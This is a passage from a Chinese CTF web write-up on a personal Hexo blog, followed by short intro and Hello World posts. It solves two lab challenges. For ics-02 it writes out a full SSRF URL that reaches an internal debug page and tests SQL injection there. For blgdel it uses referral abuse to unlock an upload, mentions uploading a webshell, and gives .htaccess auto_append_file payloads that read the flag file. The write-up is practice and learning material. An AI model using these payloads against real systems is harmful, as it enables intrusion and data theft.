<h2 id="ics-02"><a href="#ics-02" class="headerlink" title="ics-02"></a><a name="_Toc28387068"><span lang=EN-US style='font-size:15.0pt;line-height:173%;font-family:黑体'>ics-02</span></a></h2><p><span>打开到一个下载<span lang=EN-US>paper</span>的，下下来看到<span lang=EN-US>PDF</span>头，改个后缀看到内容试<span lang=EN-US>SSRF</span>，提示就是<span lang=EN-US>SSRF</span>了，<span lang=EN-US>PDF<br></span>里面也没有什么奇怪的地方。</span><span>但是这个页面面什么都没有，扫一下目录，有大发现</span><span lang=EN-US><img src="/2020/02/04/First/image203.jpg" class=""></span><span>调试文件不允许访问，显示<span lang=EN-US>ip</span>不允许</span><span>那我们看看另一个，发现一个感觉可以注入的页面</span><span lang=EN-US><img src="/2020/02/04/First/image204.jpg" class=""></span><span>传注入都是<span lang=EN-US>something wrong</span>，看来得利用<span la
ng=EN-US>debug</span>文件，在下载<span lang=EN-US>pdf</span>的时候发现他下载的模式是向<span lang=EN-US>download.php</span>进行传参，我们可以利用<span lang=EN-US>ssrf</span>来向<span lang=EN-US>debug</span>文件进行参数传递</span><span>我们尝试构造</span><span lang=EN-US>[<a href="http://111.198.29.45:36488/download.php?dl=http://127.0.0.1/secret/secret_debug.php?s=3%26txtfirst_name=1234%26txtmiddle_name=1234%26" target="_blank" rel="noopener">http://111.198.29.45:36488/download.php?dl=http://127.0.0.1/secret/secret_debug.php?s=3%26txtfirst_name=1234%26txtmiddle_name=1234%26</a><br>txtname_suffix=asdf%26txtLast_name=asdf%26txtdob=12%27%26txtdl_nmbr=3%26txtRetypeDL=3%26a=3](<a href="http://111.198.29.45:36488/download.php?dl=http://127.0.0.1/secret/secret_debug.php?s=3%26txtfirst_name=1234%" target="_blank" rel="noopener">http://111.198.29.45:36488/download.php?dl=http://127.0.0.1/secret/secret_debug.php?s=3%26txtfirst_name=1234%</a><br>26txtmiddle_name=1234%26txtname_suffix=asdf%26txtLast_name=asdf%26txtdob=12%27%26txtdl_nmbr=3%26txtRetypeDL=3%26a=3)</span>在<span lang=EN-US>first_name</span>处可以进行注入，写个脚本</p>
<p><span lang=EN-US><img src="/2020/02/04/First/image205.jpg" class=""></span></p>
<p>结果如下<span lang=EN-US>flag{cpg9ssnu_OOOOe333eetc_2018}</span></p>
<h2 id="blgdel"><a href="#blgdel" class="headerlink" title="blgdel"></a><a name="_Toc28387069"><span lang=EN-US style='font-size:15.0pt;line-height:173%;font-family:黑体'>blgdel</span></a></h2><p>打开题目，看到又是买东西，扫一下目录<span lang=EN-US><img src="/2020/02/04/First/image206.jpg" class=""></span>有代码<span lang=EN-US><img src="/2020/02/04/First/image207.jpg" class=""></span>还有个<span lang=EN-US>sql.txt</span><span lang=EN-US></p>
<img src="/2020/02/04/First/image208.jpg" class=""></span>列表信息都给的差不多了看看之前的代码，发现还有东西，有个<span lang=EN-US>upload</span>，上传的地方有替换操作，还有用户页面注册登录一下，发现上传点，但是显示我分数不够？<span lang=EN-US><img src="/2020/02/04/First/image209.jpg" class=""></span>这设计无语了<span lang=EN-US>2333</span>，得多得分了看来我以为要窃取<span lang=EN-US>admin</span>的<span lang=EN-US>cookie</span>，看了<span lang=EN-US>wp</span>说推荐人可以加分
<p>那注册<span lang=EN-US>10</span>个达到<span lang=EN-US>100</span>积分进入上传界面上传一个马，但是发现访问没反应，<span lang=EN-US>wp</span>里说代码会被替换，得用<span lang=EN-US>.htaccess</span>大多数协议被过滤了，只能分析代码中的<span lang=EN-US>master</span>协议先执行<span lang=EN-US>_construct</span>在进行<span lang=EN-US>stream_open</span>等流操作，可以通过构造这个<span lang=EN-US>master</span>协议来搜索文件，包含成功的话，这个文件的内容会映射到相应文件里面<span lang=EN-US>/</span>需要编码再传入尝试构造<span lang=EN-US>php_value auto_append_file master://search/path=%2fhome%2f&amp;name=flag</span><br>可以得到<span lang=EN-US><img src="%E6%96%B0%E5%BB%BA%20Microsoft%20Word%20%E6%96%87%E6%A1%A3.files/image210.jpg" alt=""></span>再次构造<span lang=EN-US>php_value auto_append_file /home/hiahiahia_flag</span><br><span lang=EN-US><img src="/2020/02/04/First/image211.jpg" class=""></span>即可。<a name="_Toc529976061"></a></p>
<p><span lang=EN-US>&nbsp;</span></p>
<p><span lang=EN-US>&nbsp;</span></p>
<p><span lang=EN-US>&nbsp;</span></p>
</div>

<script src="/live2d-widget/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2d-widget/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"log":true,"model":{"scale":1,"hHeadPos":0.5,"vHeadPos":0.618,"jsonPath":"/live2d-widget/assets/live2d-widget-model-koharu/assets/koharu.model.json"},"display":{"superSample":2,"width":200,"height":400,"position":"right","hOffset":0,"vOffset":-20},"mobile":{"show":true,"scale":0.5},"react":{"opacityDefault":0.7,"opacityOnHover":0.2}});</script><script src="/live2d-widget/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2d-widget/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"log":true,"model":{"scale":1,"hHeadPos":0.5,"vHeadPos":0.618,"jsonPath":"/live2d-widget/assets/live2d-widget-model-koharu/assets/koharu.model.json"},"display":{"superSample":2,"width":200,"height":400,"position":"right","hOffset":0,"vOffset":-20},"mobile":{"show":true,"scale":0.5},"react":{"opacityDefault":0.7,"opacityOnHover":0.2}});</script></body>

</html>


      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

        
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block home" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="https://kkotori.github.io/2020/02/04/webfirst/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="K_Kotori">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="WS">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          
            <a href="/2020/02/04/webfirst/" class="post-title-link" itemprop="url">Introduction</a>
        </h1>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>
              

              <time title="创建时间：2020-02-04 15:28:13 / 修改时间：16:23:39" itemprop="dateCreated datePublished" datetime="2020-02-04T15:28:13+08:00">2020-02-04</time>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <pre><code>第一次尝试搭建博客，到此也成功了，稍微有些话想说。</code></pre><h2 id="关于创建博客"><a href="#关于创建博客" class="headerlink" title="关于创建博客"></a>关于创建博客</h2><p>   　　我其实老早就应该搭建了，怪自己太懒，把资料一存放电脑里了。结果很多资料因为双系统的崩溃而丢失，只好重装系统，觉得十分可惜，惭愧惭愧，于是在放假期间进行了资料整理统一，避免重蹈覆辙。博客内容偏向资料收集与个人写的一些wp。</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

        
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block home" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="https://kkotori.github.io/2020/01/24/hello-world/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="K_Kotori">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="WS">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          
            <a href="/2020/01/24/hello-world/" class="post-title-link" itemprop="url">Hello World</a>
        </h1>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2020-01-24 16:22:16" itemprop="dateCreated datePublished" datetime="2020-01-24T16:22:16+08:00">2020-01-24</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="fa fa-calendar-check-o"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2020-02-04 16:24:40" itemprop="dateModified" datetime="2020-02-04T16:24:40+08:00">2020-02-04</time>
              </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p>Welcome to <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/" target="_blank" rel="noopener">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html" target="_blank" rel="noopener">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues" target="_blank" rel="noopener">GitHub</a>.</p>
<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">"My New Post"</span></span><br></pre></td></tr></table></figure>

<p>More info: <a href="https://hexo.io/docs/writing.html" target="_blank" rel="noopener">Writing</a></p>
<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>

<p>More info: <a href="https://hexo.io/docs/server.html" target="_blank" rel="noopener">Server</a></p>
<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>

<p>More info: <a href="https://hexo.io/docs/generating.html" target="_blank" rel="noopener">Generating</a></p>
<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>

<p>More info: <a href="https://hexo.io/docs/one-command-deployment.html" target="_blank" rel="noopener">Deployment</a></p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

  </div>

  



          </div>
          

<script>
  window.addEventListener('tabs:register', () => {
    let activeClass = CONFIG.comments.activeClass;
    if (CONFIG.comments.storage) {
      activeClass = localStorage.getItem('comments_active') || activeClass;
    }
    if (activeClass) {
      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
      if (activeTab) {
        activeTab.click();
      }
    }
  });
  if (CONFIG.comments.storage) {
    window.addEventListener('tabs:click', event => {
      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
      let commentClass = event.target.classList[1];
      localStorage.setItem('comments_active', commentClass);
    });
  }
</script>

        </div>
          
  
  <div class="toggle sidebar-toggle">
    <span class="toggle-line toggle-line-first"></span>
    <span class="toggle-line toggle-line-middle"></span>
    <span class="toggle-line toggle-line-last"></span>
  </div>

  <aside class="sidebar">
    <div class="sidebar-inner">

      <ul class="sidebar-nav motion-element">
        <li class="sidebar-nav-toc">
          文章目录
        </li>
        <li class="sidebar-nav-overview">
          站点概览
        </li>
      </ul>

      <!--noindex-->
      <div class="post-toc-wrap sidebar-panel">
      </div>
      <!--/noindex-->

      <div class="site-overview-wrap sidebar-panel">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
  <p class="site-author-name" itemprop="name">K_Kotori</p>
  <div class="site-description" itemprop="description"></div>
</div>
<div class="site-state-wrap motion-element">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
          <a href="/archives/">
        
          <span class="site-state-item-count">10</span>
          <span class="site-state-item-name">日志</span>
        </a>
      </div>
      <div class="site-state-item site-state-tags">
        <span class="site-state-item-count">3</span>
        <span class="site-state-item-name">标签</span>
      </div>
  </nav>
</div>



      </div>

    </div>
  </aside>
  <div id="sidebar-dimmer"></div>


      </div>
    </main>

    <footer class="footer">
      <div class="footer-inner">
        

<div class="copyright">
  
  &copy; 
  <span itemprop="copyrightYear">2020</span>
  <span class="with-love">
    <i class="fa fa-user"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">K_Kotori</span>
</div>
  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> 强力驱动 v4.2.0
  </div>
  <span class="post-meta-divider">|</span>
  <div class="theme-info">主题 – <a href="https://muse.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Muse</a> v7.7.0
  </div>

        








      </div>
    </footer>
  </div>

  
  <script src="/lib/anime.min.js"></script>
  <script src="/lib/velocity/velocity.min.js"></script>
  <script src="/lib/velocity/velocity.ui.min.js"></script>

<script src="/js/utils.js"></script>

<script src="/js/motion.js"></script>


<script src="/js/schemes/muse.js"></script>


<script src="/js/next-boot.js"></script>




  















  

  

<script src="/live2d-widget/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2d-widget/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"log":true,"model":{"scale":1,"hHeadPos":0.5,"vHeadPos":0.618,"jsonPath":"/live2d-widget/assets/live2d-widget-model-koharu/assets/koharu.model.json"},"display":{"superSample":2,"width":200,"height":400,"position":"right","hOffset":0,"vOffset":-20},"mobile":{"show":true,"scale":0.5},"react":{"opacityDefault":0.7,"opacityOnHover":0.2}});</script></body>
</html>
